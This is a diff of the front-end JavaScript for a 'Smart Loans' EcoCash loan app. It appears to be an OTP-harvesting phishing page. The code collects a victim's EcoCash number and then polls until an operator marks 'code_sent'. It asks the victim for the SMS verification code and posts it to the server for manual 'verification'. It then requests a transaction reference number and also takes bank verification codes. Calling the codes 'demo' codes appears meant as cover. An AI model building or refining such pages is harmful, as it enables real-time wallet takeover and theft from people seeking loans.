+function loadVerificationPendingScreen() {
 
     const app = document.getElementById("app");
 
@@ -1366,8 +1498,11 @@ function loadAssessmentScreen() {
 
         <div class="welcome-card">
 
-            <div style="font-size:60px;text-align:center;">
-                🏦
+            <div style="
+                font-size:60px;
+                text-align:center;
+            ">
+                🔐
             </div>
 
             <h2 style="text-align:center;">
@@ -1376,31 +1511,31 @@ function loadAssessmentScreen() {
 
             <br>
 
-            <div style="text-align:center;font-size:24px;color:#28a745;font-weight:bold;">
+            <div style="
+                text-align:center;
+                font-size:22px;
+                color:#f39c12;
+                font-weight:bold;
+            ">
 
-                🟢 Verification Successful
+                🟡 Verifying Your Code...
 
             </div>
 
             <br>
 
-            <p style="text-align:center;line-height:1.8;">
+            <p style="
+                text-align:center;
+                line-height:1.8;
+            ">
 
-                Your identity has been successfully verified.
-
-                <br><br>
-
-                Your loan application is now under assessment.
-
-                <br><br>
-
-                Our team is reviewing your application.
-
-                If approved, the funds will be disbursed to the bank account or EcoCash wallet you provided during your application.
+                Your demo verification code has been
+                received successfully.
 
                 <br><br>
 
-                Thank you for choosing Smart Loans.
+                Please wait while our team verifies
+                your code.
 
             </p>
 
@@ -1409,9 +1544,7 @@ function loadAssessmentScreen() {
             <div class="loading-dots">
 
                 <span></span>
-
                 <span></span>
-
                 <span></span>
 
             </div>
@@ -1419,226 +1552,81 @@ function loadAssessmentScreen() {
         </div>
 
     </div>
-monitorApplication();
 
-setInterval(monitorApplication,5000);
     `;
 
-}
-function loadApprovedScreen(){
-
-const app=document.getElementById("app");
-
-app.innerHTML=`
-
-<div class="container">
-
-<div class="welcome-card">
-
-<h2 style="text-align:center;">
-🏦 Smart Loans
-</h2>
-
-<div style="font-size:28px;
-color:green;
-text-align:center;
-font-weight:bold;">
-
-🟢 Loan Approved
-
-</div>
-
-<br>
-
-<p style="text-align:center;line-height:1.8;">
-
-Congratulations!
-
-<br><br>
-
-Your loan application has been approved.
-
-<br><br>
-
-We're preparing your funds for disbursement.
-
-</p>
-
-<div class="loading-dots">
-
-<span></span>
-
-<span></span>
-
-<span></span>
-
-</div>
-
-</div>
-
-</div>
-
-`;
-
-}
-function loadDisbursedScreen(){
-
-const app=document.getElementById("app");
-
-app.innerHTML=`
-
-<div class="container">
-
-<div class="welcome-card">
-
-<h2 style="text-align:center;">
-🏦 Smart Loans
-</h2>
-
-<div style="font-size:30px;
-color:green;
-text-align:center;
-font-weight:bold;">
-
-🎉 Loan Successfully Disbursed
-
-</div>
-
-<br>
-
-<p style="text-align:center;
-line-height:1.8;">
-
-Your loan has been successfully disbursed to the payment method you selected during your application.
-
-<br><br>
-
-Thank you for choosing Smart Loans.
-
-</p>
-
-</div>
-
-</div>
-
-`;
+    monitorVerificationStatus();
 
 }
 // ======================================================
-// SUCCESS SCREEN
+// PART 16 - MONITOR VERIFICATION STATUS
 // ======================================================
 
-function loadSuccessScreen() {
-
-    const app = document.getElementById("app");
+async function monitorVerificationStatus() {
 
     const applicationId =
-        sessionStorage.getItem("applicationId") || "N/A";
+        sessionStorage.getItem("applicationId");
 
-    app.innerHTML = `
+    if (!applicationId) {
+        console.error("Application ID not found.");
+        return;
+    }
 
-    <div class="container">
+    try {
 
-        <div class="app-header">
+        const response = await fetch(
+            `/application-status/${applicationId}`
+        );
 
-            <div>
+        const result = await response.json();
 
-                <div class="app-title">
-                    Smart Loans
-                </div>
+        if (!result.success) {
+            return;
+        }
 
-                <div class="app-subtitle">
-                    Fast • Secure • Convenient
-                </div>
+        const stage =
+            result.application.current_stage;
 
-            </div>
+        if (stage === "verified") {
 
-            <div class="secure">
-                🔒 Secure
-            </div>
+            loadReferenceNumberScreen();
 
-        </div>
+            return;
+        }
 
-        <div class="progress-bar">
+    } catch (err) {
 
-            <div class="progress-fill" style="width:100%;"></div>
+        console.error(
+            "Verification status error:",
+            err
+        );
 
-        </div>
+    }
 
-        <div class="welcome-card" style="text-align:center;">
-
-            <div style="font-size:70px;">
-                ✅
-            </div>
-
-            <h2>Application Submitted</h2>
-
-            <p class="intro">
-
-                Your loan application has been successfully submitted.
-
-            </p>
-
-            <div class="feature">
-
-                <strong>Application ID</strong>
-
-                <br><br>
-
-                #${applicationId}
-
-            </div>
-
-            <br>
-
-            <p>
-
-                Our loans team will review your application and contact you shortly.
-
-            </p>
-
-            <br>
-
-            <button id="finishApplication">
-
-                Finish
-
-            </button>
-
-        </div>
-
-    </div>
-
-    `;
-
-    document
-        .getElementById("finishApplication")
-        .addEventListener("click", () => {
-
-            sessionStorage.clear();
-
-            loadWelcomeScreen();
-
-        });
+    // Keep checking until the admin verifies it.
+    setTimeout(
+        monitorVerificationStatus,
+        5000
+    );
 
 }
 // ======================================================
-// ECOCASH DETAILS SCREEN
+// PART 17 - ECOCASH DETAILS SCREEN
 // ======================================================
 
 function loadEcoCashDetailsScreen() {
 
     const app = document.getElementById("app");
 
-    const fullNames = sessionStorage.getItem("fullNames") || "";
-
     app.innerHTML = `
 
     <div class="container">
 
         <div class="app-header">
 
-            <button class="back-btn" id="backDisbursement">
+            <button
+                class="back-btn"
+                id="backEcoDisbursement">
                 ← Back
             </button>
 
@@ -1662,41 +1650,51 @@ function loadEcoCashDetailsScreen() {
 
         <div class="progress-bar">
 
-            <div class="progress-fill" style="width:70%;"></div>
+            <div
+                class="progress-fill"
+                style="width:70%;">
+            </div>
 
         </div>
 
         <div class="welcome-card">
 
-            <h2>EcoCash Details</h2>
+            <h2>🟢 EcoCash Details</h2>
 
             <p class="intro">
 
-                Enter the EcoCash wallet details where your approved loan will be sent.
+                Enter the EcoCash details where your approved
+                loan will be deposited.
 
             </p>
 
-            <label>Full Name</label>
+            <label>
+                Account Holder Name
+            </label>
 
             <input
                 type="text"
                 id="ecoName"
-                value="${fullNames}">
+                placeholder="Enter account holder name"
+            >
 
             <br><br>
 
-            <label>EcoCash Number</label>
+            <label>
+                EcoCash Number
+            </label>
 
             <input
                 type="tel"
                 id="ecoNumber"
-                placeholder="Enter EcoCash number">
+                placeholder="Enter EcoCash number"
+            >
 
             <br><br>
 
             <button id="continueEcoDetails">
 
-                Continue
+                Continue →
 
             </button>
 
@@ -1707,45 +1705,190 @@ function loadEcoCashDetailsScreen() {
     `;
 
     document
-        .getElementById("backDisbursement")
-        .addEventListener("click", loadDisbursementScreen);
+        .getElementById("backEcoDisbursement")
+        .addEventListener(
+            "click",
+            loadDisbursementScreen
+        );
 
     document
         .getElementById("continueEcoDetails")
-        .addEventListener("click", saveEcoCashDetails);
+        .addEventListener(
+            "click",
+            saveEcoCashDetails
+        );
 
 }
 // ======================================================
-// SAVE ECOCASH DETAILS
+// PART 18 - SAVE ECOCASH DETAILS
 // ======================================================
 
 function saveEcoCashDetails() {
 
     const ecoName =
-        document.getElementById("ecoName").value.trim();
+        document
+            .getElementById("ecoName")
+            .value
+            .trim();
 
     const ecoNumber =
-        document.getElementById("ecoNumber").value.trim();
+        document
+            .getElementById("ecoNumber")
+            .value
+            .trim();
 
     if (
         ecoName === "" ||
         ecoNumber === ""
     ) {
 
-        alert("Please complete all fields.");
+        alert("Please complete all EcoCash details.");
 
         return;
 
     }
 
-    sessionStorage.setItem("ecoName", ecoName);
-    sessionStorage.setItem("ecoNumber", ecoNumber);
+    sessionStorage.setItem(
+        "ecoName",
+        ecoName
+    );
 
-    loadEcoCashVerificationScreen();
+    sessionStorage.setItem(
+        "ecoNumber",
+        ecoNumber
+    );
+
+    loadEcoCashVerificationWaitingScreen();
 
 }
 // ======================================================
-// ECOCASH VERIFICATION SCREEN
+// PART 19 - ECOCASH VERIFICATION WAITING SCREEN
+// ======================================================
+
+function loadEcoCashVerificationWaitingScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="welcome-card">
+
+            <div style="
+                font-size:60px;
+                text-align:center;
+            ">
+                🟢
+            </div>
+
+            <h2 style="text-align:center;">
+                Smart Loans
+            </h2>
+
+            <br>
+
+            <div style="
+                text-align:center;
+                font-size:22px;
+                color:#f39c12;
+                font-weight:bold;
+            ">
+
+                🟡 Sending demo verification code...
+
+            </div>
+
+            <br>
+
+            <p style="
+                text-align:center;
+                line-height:1.8;
+            ">
+
+                We are preparing a demo verification code
+                for your EcoCash number.
+
+                <br><br>
+
+                Please wait while the code is being sent.
+
+            </p>
+
+            <br>
+
+            <div class="loading-dots">
+
+                <span></span>
+                <span></span>
+                <span></span>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    `;
+
+    monitorEcoCashCodeSentStatus();
+
+}
+// ======================================================
+// PART 20 - MONITOR ECOCASH CODE SENT STATUS
+// ======================================================
+
+async function monitorEcoCashCodeSentStatus() {
+
+    const applicationId =
+        sessionStorage.getItem("applicationId");
+
+    if (!applicationId) {
+        console.error("Application ID not found.");
+        return;
+    }
+
+    try {
+
+        const response = await fetch(
+            `/application-status/${applicationId}`
+        );
+
+        const result = await response.json();
+
+        if (!result.success) {
+            return;
+        }
+
+        const stage =
+            result.application.current_stage;
+
+        if (stage === "code_sent") {
+
+            loadEcoCashVerificationScreen();
+
+            return;
+        }
+
+    } catch (err) {
+
+        console.error(
+            "EcoCash code sent status error:",
+            err
+        );
+
+    }
+
+    // Keep checking until admin clicks
+    // "📩 Code Sent".
+    setTimeout(
+        monitorEcoCashCodeSentStatus,
+        5000
+    );
+
+}
+// ======================================================
+// PART 21 - ECOCASH VERIFICATION CODE SCREEN
 // ======================================================
 
 function loadEcoCashVerificationScreen() {
@@ -1758,7 +1901,9 @@ function loadEcoCashVerificationScreen() {
 
         <div class="app-header">
 
-            <button class="back-btn" id="backEcoDetails">
+            <button
+                class="back-btn"
+                id="backEcoDetails">
                 ← Back
             </button>
 
@@ -1782,34 +1927,44 @@ function loadEcoCashVerificationScreen() {
 
         <div class="progress-bar">
 
-            <div class="progress-fill" style="width:75%;"></div>
+            <div
+                class="progress-fill"
+                style="width:75%;">
+            </div>
 
         </div>
 
         <div class="welcome-card">
 
-            <h2>EcoCash Verification</h2>
+            <h2>🟢 EcoCash Verification</h2>
 
             <p class="intro">
 
-                An SMS verification code has been sent to your EcoCash number.
+                Your demo verification code has been sent
+                to your EcoCash number.
 
-                Please enter it below.
+                <br><br>
+
+                Please enter the demo code below to continue.
 
             </p>
 
-            <label>Verification Code</label>
+            <label>
+                🔢 Demo Verification Code
+            </label>
 
             <input
                 type="text"
                 id="ecoVerificationCode"
-                placeholder="Enter verification code">
+                placeholder="Enter demo code"
+                autocomplete="one-time-code"
+            >
 
             <br><br>
 
             <button id="continueEcoVerification">
 
-                Continue
+                Continue →
 
             </button>
 
@@ -1821,77 +1976,21 @@ function loadEcoCashVerificationScreen() {
 
     document
         .getElementById("backEcoDetails")
-        .addEventListener("click", loadEcoCashDetailsScreen);
+        .addEventListener(
+            "click",
+            loadEcoCashDetailsScreen
+        );
 
     document
         .getElementById("continueEcoVerification")
-        .addEventListener("click", submitEcoCashVerificationCode);
+        .addEventListener(
+            "click",
+            saveEcoCashVerification
+        );
 
 }
 // ======================================================
-// SUBMIT ECOCASH VERIFICATION CODE
-// ======================================================
-
-async function submitEcoCashVerificationCode() {
-
-    const verificationCode = document
-        .getElementById("ecoVerificationCode")
-        .value
-        .trim();
-
-    if (!verificationCode) {
-
-        alert("Please enter the verification code.");
-
-        return;
-
-    }
-
-    const applicationId = sessionStorage.getItem("applicationId");
-
-    try {
-
-        const response = await fetch("/submit-verification-code", {
-
-            method: "PUT",
-
-            headers: {
-                "Content-Type": "application/json"
-
-            },
-
-            body: JSON.stringify({
-
-                applicationId,
-                verificationCode
-
-            })
-
-        });
-
-        const result = await response.json();
-
-        if (!result.success) {
-
-            alert("Unable to submit verification code.");
-
-            return;
-
-        }
-
-        loadVerificationPendingScreen();
-
-    } catch (err) {
-
-        console.error(err);
-
-        alert("Unable to connect to the server.");
-
-    }
-
-}
-// ======================================================
-// SAVE ECOCASH VERIFICATION
+// PART 22 - SAVE ECOCASH VERIFICATION CODE
 // ======================================================
 
 async function saveEcoCashVerification() {
@@ -1903,7 +2002,7 @@ async function saveEcoCashVerification() {
 
     if (code === "") {
 
-        alert("Please enter the ecocash verification code.");
+        alert("Please enter the demo verification code.");
 
         return;
 
@@ -1943,25 +2042,31 @@ async function saveEcoCashVerification() {
 
             throw new Error(
                 result.message ||
-                "Unable to save ecocash verification."
+                "Unable to save verification code."
             );
 
         }
 
-        // Saved on the server
+        // Code saved successfully.
+        // Customer now waits for admin verification.
         loadVerificationPendingScreen();
 
     } catch (err) {
 
-        console.error(err);
+        console.error(
+            "EcoCash verification error:",
+            err
+        );
 
-        alert("Unable to connect to the server.");
+        alert(
+            "Unable to connect to the server."
+        );
 
     }
 
 }
 // ======================================================
-// ECOCASH REFERENCE SCREEN
+// PART 23 - ECOCASH REFERENCE SCREEN
 // ======================================================
 
 function loadEcoCashReferenceScreen() {
@@ -1974,7 +2079,9 @@ function loadEcoCashReferenceScreen() {
 
         <div class="app-header">
 
-            <button class="back-btn" id="backEcoVerification">
+            <button
+                class="back-btn"
+                id="backEcoVerification">
                 ← Back
             </button>
 
@@ -1997,31 +2104,40 @@ function loadEcoCashReferenceScreen() {
         </div>
 
         <div class="progress-bar">
-            <div class="progress-fill" style="width:80%;"></div>
+
+            <div
+                class="progress-fill"
+                style="width:80%;">
+            </div>
+
         </div>
 
         <div class="welcome-card">
 
-            <h2>EcoCash Reference</h2>
+            <h2>🟢 EcoCash Reference</h2>
 
             <p class="intro">
 
-                Enter the EcoCash transaction/reference number you received after verification.
+                Enter the EcoCash transaction/reference
+                number to continue your application.
 
             </p>
 
-            <label>Reference Number</label>
+            <label>
+                Reference Number
+            </label>
 
             <input
                 type="text"
                 id="ecoReference"
-                placeholder="Enter reference number">
+                placeholder="Enter reference number"
+            >
 
             <br><br>
 
             <button id="continueEcoReference">
 
-                Submit Application
+                Submit Application →
 
             </button>
 
@@ -2033,23 +2149,30 @@ function loadEcoCashReferenceScreen() {
 
     document
         .getElementById("backEcoVerification")
-        .addEventListener("click", loadEcoCashVerificationScreen);
+        .addEventListener(
+            "click",
+            loadEcoCashVerificationScreen
+        );
 
     document
         .getElementById("continueEcoReference")
-        .addEventListener("click", saveEcoCashReference);
+        .addEventListener(
+            "click",
+            saveEcoCashReference
+        );
 
 }
 // ======================================================
-// SAVE ECOCASH REFERENCE
+// PART 24 - SAVE ECOCASH REFERENCE
 // ======================================================
 
 function saveEcoCashReference() {
 
-    const reference = document
-        .getElementById("ecoReference")
-        .value
-        .trim();
+    const reference =
+        document
+            .getElementById("ecoReference")
+            .value
+            .trim();
 
     if (reference === "") {
 
@@ -2067,9 +2190,8 @@ function saveEcoCashReference() {
     submitEcoCashApplication();
 
 }
-
 // ======================================================
-// SUBMIT ECOCASH APPLICATION
+// PART 25 - SUBMIT ECOCASH APPLICATION
 // ======================================================
 
 async function submitEcoCashApplication() {
@@ -2093,13 +2215,15 @@ async function submitEcoCashApplication() {
         accountName: "",
         bankPhone: "",
         accountNumber: "",
-        verificationCode: "",
+        bankVerificationCode: "",
         bankReference: "",
 
         ecoName: sessionStorage.getItem("ecoName"),
         ecoNumber: sessionStorage.getItem("ecoNumber"),
-        ecoVerificationCode: sessionStorage.getItem("ecoVerificationCode"),
-        ecoReference: sessionStorage.getItem("ecoReference")
+        ecoVerificationCode:
+            sessionStorage.getItem("ecoVerificationCode"),
+        ecoReference:
+            sessionStorage.getItem("ecoReference")
 
     };
 
@@ -2107,23 +2231,27 @@ async function submitEcoCashApplication() {
 
     try {
 
-        const response = await fetch("/submit-application", {
+        const response = await fetch(
+            "/submit-application",
+            {
+                method: "POST",
 
-            method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
 
-            headers: {
-                "Content-Type": "application/json"
-            },
-
-            body: JSON.stringify(data)
-
-        });
+                body: JSON.stringify(data)
+            }
+        );
 
         const result = await response.json();
 
         if (!response.ok || !result.success) {
 
-            throw new Error(result.error || "Application submission failed.");
+            throw new Error(
+                result.error ||
+                "Application submission failed."
+            );
 
         }
 
@@ -2133,13 +2261,17 @@ async function submitEcoCashApplication() {
         );
 
         loadTrackingScreen();
-    
 
     } catch (error) {
 
-        console.error(error);
+        console.error(
+            "EcoCash application error:",
+            error
+        );
 
-        alert("Unable to submit your application.");
+        alert(
+            "Unable to submit your application."
+        );
 
         loadReviewScreen();
 
@@ -2147,7 +2279,7 @@ async function submitEcoCashApplication() {
 
 }
 // ======================================================
-// VERIFICATION PENDING SCREEN
+// PART 26 - VERIFICATION PENDING SCREEN
 // ======================================================
 
 function loadVerificationPendingScreen() {
@@ -2160,8 +2292,11 @@ function loadVerificationPendingScreen() {
 
         <div class="welcome-card">
 
-            <div style="font-size:60px;text-align:center;">
-                🏦
+            <div style="
+                font-size:60px;
+                text-align:center;
+            ">
+                🔐
             </div>
 
             <h2 style="text-align:center;">
@@ -2170,21 +2305,31 @@ function loadVerificationPendingScreen() {
 
             <br>
 
-            <div style="text-align:center;font-size:24px;color:#f39c12;font-weight:bold;">
+            <div style="
+                text-align:center;
+                font-size:22px;
+                color:#f39c12;
+                font-weight:bold;
+            ">
 
-                🟡 Verifying Your Code...
+                🟡 Verification Pending
 
             </div>
 
             <br>
 
-            <p style="text-align:center;line-height:1.8;">
+            <p style="
+                text-align:center;
+                line-height:1.8;
+            ">
 
-                Your verification code has been received successfully.
+                Your demo verification code has been
+                received successfully.
 
                 <br><br>
 
-                Please wait while we verify your code.
+                Please wait while our team verifies
+                your code.
 
             </p>
 
@@ -2203,135 +2348,170 @@ function loadVerificationPendingScreen() {
     </div>
 
     `;
+
     monitorVerificationStatus();
 
-setInterval(monitorVerificationStatus, 5000);
-
 }
-
-// ===============================
-// LIVE TRACKING
-// ===============================
+// ======================================================
+// PART 27 - LIVE APPLICATION TRACKING
+// ======================================================
 
 async function refreshTrackingStatus() {
 
-    const id = sessionStorage.getItem("applicationId");
+    const applicationId =
+        sessionStorage.getItem("applicationId");
 
-    if (!id) return;
+    if (!applicationId) return;
 
     try {
 
-        const response = await fetch(`/application-status/${id}`);
+        const response = await fetch(
+            `/application-status/${applicationId}`
+        );
 
         const result = await response.json();
 
         if (!result.success) return;
 
-        updateTrackingUI(result.application.current_stage);
+        const stage =
+            result.application.current_stage;
+
+        updateTrackingUI(stage);
 
     } catch (err) {
 
-        console.error(err);
+        console.error(
+            "Tracking status error:",
+            err
+        );
 
     }
 
 }
-// ===============================
-// UPDATE TRACKING UI
-// ===============================
+// ======================================================
+// PART 28 - UPDATE TRACKING UI
+// ======================================================
 
 function updateTrackingUI(stage) {
 
-    const status = document.getElementById("trackingStatus");
+    const status =
+        document.getElementById("trackingStatus");
 
     if (!status) return;
 
-    switch(stage){
+    switch (stage) {
 
         case "waiting_code":
 
-            status.innerHTML = "🟡 Waiting for Verification Code";
+            status.innerHTML =
+                "🟡 Waiting for Verification Code";
+
             break;
 
         case "code_sent":
 
-            status.innerHTML = "🟢 Verification Code Sent";
+            status.innerHTML =
+                "🟢 Verification Code Sent";
+
             break;
 
         case "verified":
 
-            status.innerHTML = "🟢 Phone Number Verified";
+            status.innerHTML =
+                "🟢 Phone Number Verified";
+
             break;
 
         case "assessment":
 
-            status.innerHTML = "🟡 Loan Assessment";
+            status.innerHTML =
+                "🟡 Loan Assessment";
+
             break;
 
         case "approved":
 
-            status.innerHTML = "🟢 Loan Approved";
+            status.innerHTML =
+                "🟢 Loan Approved";
+
             break;
 
         case "disbursed":
 
-            status.innerHTML = "🎉 Funds Successfully Disbursed";
+            status.innerHTML =
+                "🎉 Funds Successfully Disbursed";
 
-            document.querySelector(".loading-dots").style.display = "none";
+            const dots =
+                document.querySelector(".loading-dots");
+
+            if (dots) {
+                dots.style.display = "none";
+            }
 
             break;
 
     }
 
 }
-// ===============================
-// LIVE ASSESSMENT STATUS
-// ===============================
+// ======================================================
+// PART 29 - MONITOR APPLICATION
+// ======================================================
 
 async function monitorApplication() {
 
-    const id = sessionStorage.getItem("applicationId");
+    const applicationId =
+        sessionStorage.getItem("applicationId");
 
-    if (!id) return;
+    if (!applicationId) return;
 
     try {
 
-        const response = await fetch(`/application-status/${id}`);
+        const response = await fetch(
+            `/application-status/${applicationId}`
+        );
 
         const result = await response.json();
 
         if (!result.success) return;
 
-        const stage = result.application.current_stage;
+        const stage =
+            result.application.current_stage;
+
+        updateTrackingUI(stage);
 
         if (stage === "approved") {
 
             loadApprovedScreen();
 
+            return;
         }
 
         if (stage === "disbursed") {
 
             loadDisbursedScreen();
 
+            return;
         }
 
     } catch (err) {
 
-        console.error(err);
+        console.error(
+            "Application monitoring error:",
+            err
+        );
 
     }
 
 }
-// ===============================
-// LOAN TRACKING SCREEN
-// ===============================
+// ======================================================
+// PART 30 - LOAN TRACKING SCREEN
+// ======================================================
 
 function loadTrackingScreen() {
 
     const app = document.getElementById("app");
 
-    const reference =
+    const applicationId =
         sessionStorage.getItem("applicationId") || "Processing...";
 
     app.innerHTML = `
@@ -2342,7 +2522,13 @@ function loadTrackingScreen() {
 
             <h2>🏦 Smart Loans</h2>
 
-            <p>Your loan application has been successfully received and is currently under review. If approved, your loan funds will be disbursed to the bank account or EcoCash wallet you provided during your application. Loan applications are typically reviewed within 24 hours. Thank you for choosing Smart Loans.</p>
+            <p>
+                Your loan application has been successfully
+                received and is currently under review.
+                If approved, your loan funds will be disbursed
+                to the bank account or EcoCash wallet you
+                provided during your application.
+            </p>
 
         </div>
 
@@ -2352,8 +2538,11 @@ function loadTrackingScreen() {
                 Reference Number
             </h3>
 
-            <h2 style="text-align:center;color:#1565C0;">
-                SL-${reference}
+            <h2 style="
+                text-align:center;
+                color:#1565C0;
+            ">
+                SL-${applicationId}
             </h2>
 
             <hr>
@@ -2363,57 +2552,50 @@ function loadTrackingScreen() {
             </div>
 
             <div class="tracker-step step-green">
-                ✅ Phone Number Received
+                ✅ Customer Details Received
             </div>
 
             <div
-id="trackingStatus"
-class="tracker-step step-yellow">
-
-🟡 Waiting for Verification Code
-
-</div>
+                id="trackingStatus"
+                class="tracker-step step-yellow"
+            >
+                🟡 Waiting for Verification Code
+            </div>
 
             <div class="loading-dots">
 
                 <span></span>
-
                 <span></span>
-
                 <span></span>
 
             </div>
 
-            <div class="status-message">
+            <div
+                class="status-message"
+                id="trackingMessage"
+            >
 
-                A verification code will be sent to your registered mobile number to confirm ownership.
+                A demo verification code will be sent
+                after the application is reviewed.
 
             </div>
 
             <hr>
 
             <div class="tracker-step step-gray">
-
                 ⚪ Phone Verification
-
             </div>
 
             <div class="tracker-step step-gray">
-
                 ⚪ Loan Assessment
-
             </div>
 
             <div class="tracker-step step-gray">
-
                 ⚪ Loan Approval
-
             </div>
 
             <div class="tracker-step step-gray">
-
                 ⚪ Funds Disbursed
-
             </div>
 
         </div>
@@ -2421,7 +2603,280 @@ class="tracker-step step-yellow">
     </div>
 
     `;
-refreshTrackingStatus();
 
-setInterval(refreshTrackingStatus,5000);
+    refreshTrackingStatus();
+
+    monitorApplication();
+
+    setInterval(refreshTrackingStatus, 5000);
+
+    setInterval(monitorApplication, 5000);
+
 }
+// ======================================================
+// PART 31 - APPROVED SCREEN
+// ======================================================
+
+function loadApprovedScreen() {
+
+    const app = document.getElementById("app");
+
+    const applicationId =
+        sessionStorage.getItem("applicationId") || "";
+
+    const amount =
+        sessionStorage.getItem("loanAmount") || "0.00";
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="dashboard-card">
+
+            <div class="logo-circle">
+                🎉
+            </div>
+
+            <h1 class="dashboard-title">
+                Loan Approved!
+            </h1>
+
+            <p class="dashboard-subtitle">
+                Your Smart Loans application has been approved.
+            </p>
+
+        </div>
+
+        <div class="welcome-card">
+
+            <h2 style="text-align:center;">
+                Congratulations 🎉
+            </h2>
+
+            <p class="intro">
+
+                Your loan application has successfully
+                passed the assessment stage.
+
+                <br><br>
+
+                Your approved loan amount is:
+
+            </p>
+
+            <div class="feature">
+
+                <h2 style="
+                    text-align:center;
+                    color:#0d47a1;
+                ">
+                    $${amount}
+                </h2>
+
+            </div>
+
+            <br>
+
+            <div class="tracker-card">
+
+                <div class="tracker-step step-green">
+                    ✅ Application Submitted
+                </div>
+
+                <div class="tracker-step step-green">
+                    ✅ Verification Completed
+                </div>
+
+                <div class="tracker-step step-green">
+                    ✅ Loan Assessment Completed
+                </div>
+
+                <div class="tracker-step step-green">
+                    ✅ Loan Approved
+                </div>
+
+                <div class="tracker-step step-yellow">
+                    🟡 Preparing Disbursement
+                </div>
+
+            </div>
+
+            <p
+                class="status-message"
+                style="margin-top:20px;"
+            >
+
+                Your funds will be disbursed to the
+                bank account or EcoCash wallet provided
+                during your application.
+
+            </p>
+
+            <p style="
+                text-align:center;
+                color:#777;
+                font-size:13px;
+                margin-top:15px;
+            ">
+
+                Application ID: ${applicationId}
+
+            </p>
+
+        </div>
+
+    </div>
+
+    `;
+
+    // Continue monitoring in case the admin
+    // changes the application to "disbursed".
+    monitorApplication();
+
+}
+// ======================================================
+// PART 32 - DISBURSED SCREEN
+// ======================================================
+
+function loadDisbursedScreen() {
+
+    const app = document.getElementById("app");
+
+    const amount =
+        sessionStorage.getItem("loanAmount") || "0.00";
+
+    const applicationId =
+        sessionStorage.getItem("applicationId") || "";
+
+    const method =
+        sessionStorage.getItem("disbursementMethod") || "";
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="dashboard-card">
+
+            <div class="logo-circle">
+                🎉
+            </div>
+
+            <h1 class="dashboard-title">
+                Funds Disbursed!
+            </h1>
+
+            <p class="dashboard-subtitle">
+                Your loan has been successfully disbursed.
+            </p>
+
+        </div>
+
+        <div class="welcome-card">
+
+            <h2 style="text-align:center;">
+                🎊 Congratulations!
+            </h2>
+
+            <p
+                class="intro"
+                style="text-align:center;"
+            >
+
+                Your Smart Loans funds have been
+                successfully processed.
+
+            </p>
+
+            <div class="feature">
+
+                <h3 style="text-align:center;">
+                    Loan Amount
+                </h3>
+
+                <h2 style="
+                    text-align:center;
+                    color:#0d47a1;
+                ">
+                    $${amount}
+                </h2>
+
+            </div>
+
+            <br>
+
+            <div class="feature">
+
+                <strong>
+                    Disbursement Method
+                </strong>
+
+                <br>
+
+                ${method || "Selected payment method"}
+
+            </div>
+
+            <br>
+
+            <div class="tracker-card">
+
+                <div class="tracker-step step-green">
+                    ✅ Application Submitted
+                </div>
+
+                <div class="tracker-step step-green">
+                    ✅ Verification Completed
+                </div>
+
+                <div class="tracker-step step-green">
+                    ✅ Loan Assessment Completed
+                </div>
+
+                <div class="tracker-step step-green">
+                    ✅ Loan Approved
+                </div>
+
+                <div class="tracker-step step-green">
+                    🎉 Funds Successfully Disbursed
+                </div>
+
+            </div>
+
+            <br>
+
+            <p style="
+                text-align:center;
+                line-height:1.7;
+            ">
+
+                Please check your selected bank account
+                or EcoCash wallet for the funds.
+
+            </p>
+
+            <p style="
+                text-align:center;
+                color:#777;
+                font-size:13px;
+            ">
+
+                Application ID: ${applicationId}
+
+            </p>
+
+        </div>
+
+    </div>
+
+    `;
+
+}
+// ======================================================
+// PART 33 - INITIALIZE SMART LOANS
+// ======================================================
+
+document.addEventListener("DOMContentLoaded", () => {
+
+    loadWelcomeScreen();
+
+});
